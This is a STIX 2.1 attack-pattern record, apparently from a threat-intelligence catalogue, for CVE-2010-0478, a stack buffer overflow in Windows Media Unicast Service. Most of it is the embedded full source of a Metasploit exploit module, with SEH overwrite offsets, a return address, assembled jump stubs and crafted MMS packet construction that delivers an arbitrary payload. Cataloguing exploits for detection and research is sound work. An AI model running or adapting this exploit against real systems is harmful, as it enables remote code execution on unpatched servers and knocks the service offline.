{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--998718f7-dbee-4e9c-99cf-51e7f1a0d300",
    "created": "2024-08-14T16:48:49.198462Z",
    "modified": "2024-08-14T16:48:49.198466Z",
    "name": "Windows Media Services ConnectFunnel Stack Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the Windows Media Unicast Service version 4.1.0.3930 (NUMS.exe). By sending a specially crafted FunnelConnect request, an attacker can execute arbitrary code under the \"NetShowServices\" user account. Windows Media Services 4.1 ships with Windows 2000 Server, but is not installed by default.  NOTE: This service does NOT restart automatically. Successful, as well as unsuccessful exploitation attempts will kill the service which prevents additional attempts. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/mmsp/ms10_025_wmss_connect_funnel.rb",
            "external_id": "ms10_025_wmss_connect_funnel.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0478"
        },
        {
            "source_name": "reference",
            "url": "https://www.lexsi.com/abonnes/labs/adviso-cve-2010-0478.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Windows Media Services ConnectFunnel Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the Windows Media\n        Unicast Service version 4.1.0.3930 (NUMS.exe). By sending a specially\n        crafted FunnelConnect request, an attacker can execute arbitrary code\n        under the \"NetShowServices\" user account. Windows Media Services 4.1 ships\n        with Windows 2000 Server, but is not installed by default.\n\n        NOTE: This service does NOT restart automatically. Successful, as well as\n        unsuccessful exploitation attempts will kill the service which prevents\n        additional attempts.\n      },\n      'Author'         => 'jduck',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2010-0478' ],\n          [ 'OSVDB', '63726' ],\n          [ 'MSB', 'MS10-025' ],\n          [ 'URL', 'https://www.lexsi.com/abonnes/labs/adviso-cve-2010-0478.txt' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 600,\n          'BadChars' => \"\\x00\\x5c\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows 2000 Pro SP4 English',\n            {\n              # Unpatched:\n              # SEH handler offset is 840\n              # Stack return is at 652\n              # \"Patched\":\n              # SEH handler offset is 832\n              'Offset' => 840,\n              'SEHOffsets' => [ 832, 840 ],\n              'EIPOffset' => 652+3,\n              'Ret' => 0x75022ac4 # p/p/r in ws2help.dll\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2010-04-13',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(1755)\n      ])\n  end\n\n  def exploit\n    @pkts = 0\n    cmd_buf = ''\n\n    # LinkViewerToMacConnect\n    subscriber = \"NSPlayer/4.1.0.3928; {68c0a090-8797-11d2-a2b3-00a0c9b60551}\"\n    #subscriber = \"NSPlayer/7.0.0.1956; {}; Host: The.Host.Net\"\n    #subscriber = \"Spooooon!\"\n    subscriber << \"\\x00\"\n    subscriber = Rex::Text.to_unicode(subscriber)\n    cmd_buf << make_command(0x30001, subscriber)\n\n    # LinkViewerToMacConnectFunnel\n    name = ''\n    name << \"\\\\\\\\\"\n    name << rand_text((target['Offset'] + 4 + 5) / 2)\n    name << \"\\\\\"\n    name << \"\\x00\"\n\n    # Convert it to Unicode..\n    name = Rex::Text.to_unicode(name)\n    #stuff = Rex::Text.pattern_create((target['Offset'] + 4 + 5) + 4)\n    stuff = rand_text((target['Offset'] + 4 + 5) + 4)\n    stuff.slice!(0,4)\n    name[4,stuff.length] = stuff\n\n    # Insert the payload..\n    name[4,payload.encoded.length] = payload.encoded\n\n    # Build the SEH frame that leads to the payload...\n    target['SEHOffsets'].each { |off|\n      seh = ''\n      case off\n      when 832\n        code = Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-652\").encode_string\n        code << rand_text(8 - code.length)\n        name[off-8,code.length] = code\n        seh << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-8\").encode_string\n        seh << rand_text(2)\n        seh << [target.ret].pack('V')\n      when 840\n        seh << generate_seh_record(target.ret)\n        asm = \"add edi, 0x04\\njmp edi\"\n        seh << Metasm::Shellcode.assemble(Metasm::Ia32.new, asm).encode_string\n      end\n      name[off,seh.length] = seh\n    }\n\n    # Make sure the return address points at an invalid address\n    off = target['EIPOffset']\n    name[off,1] = [0x80 + rand(0x7f)].pack('C')\n\n    # Add it to the command buffer..\n    cmd_buf << make_command(0x30002, name)\n\n    # Build the TcpMessageHeader ..\n    pkt = make_tcpmsghdr(cmd_buf)\n\n    # Handle the transacation..\n    connect\n    print_status(\"Sending crafy commands (#{pkt.length} bytes) ...\")\n    sock.put(pkt)\n\n    handler\n    disconnect\n  end\n\n\n  #\n  # Create a TcpMessageHeader from the supplied data\n  #\n  def make_tcpmsghdr(data)\n    len = data.length\n    # The server doesn't like packets that are bigger...\n    fail_with(Failure::BadConfig, 'Message length is too big') if (len > 0x1000)\n    len /= 8\n\n    # Pack the pieces in ...\n    pkt = [\n      1,0,0,0,           # rep, ver, verMinor, pad\n      0xb00bface,        # session id (nice)\n      data.length + 16,  # msg len\n      0x20534d4d,        # seal (\"MMS \")\n      len + 2,           # chunkCount\n      @pkts, 0,          # seq, MBZ\n      rand(0xffffffff),rand(0xffffffff) # timeSent -- w/e\n    ].pack('CCCCVVVVvvVV')\n\n    # Add the data\n    pkt << data\n\n    # Pad it to 8 bytes...\n    left = data.length % 8\n    pkt << (\"\\x00\" * (8 - left)) if (left > 0)\n\n    pkt\n  end\n\n\n  #\n  # Create a command packet\n  #\n  def make_command(msg_id, extra)\n    # Two opcodes, get handled differently..\n    case msg_id\n    when 0x30001\n      data = [0xf0f0f0f0,0x0004000b,0x0003001c].pack('VVV')\n\n    when 0x30002\n      data = [0xf0f0f0f1,0xffffffff,0,0x989680,0x00000002].pack('VVVVV')\n\n    end\n\n    # Put some data on...\n    data << extra\n\n    # Pad it to 8 bytes...\n    left = data.length % 8\n    data << (\"\\x00\" * (8 - left)) if (left > 0)\n\n    # Combine the pieces..\n    pkt = [\n      (data.length / 8) + 1,  # chunkLen\n      msg_id                  # msg ID\n    ].pack('VV')\n    pkt << data\n\n    pkt\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-04-13",
    "x_mitre_platforms": [
        "win'"
    ]
}